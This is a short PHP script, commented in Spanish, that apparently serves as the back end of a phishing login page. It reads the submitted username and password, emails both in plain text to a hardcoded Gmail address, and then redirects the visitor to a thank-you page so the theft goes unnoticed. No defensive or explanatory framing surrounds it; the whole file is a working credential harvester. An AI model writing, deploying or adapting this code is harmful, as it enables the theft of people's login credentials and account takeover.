<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $to = "allanarauz629@gmail.com";
    $subject = "Información de inicio de sesión";
    $message = "Nombre de usuario: $username\nContraseña: $password";

    // Utiliza la función mail() para enviar el correo electrónico
    mail($to, $subject, $message);

    // Puedes redirigir a una página de agradecimiento u otra después de enviar el correo
    header("Location: gracias.html");
}
?>

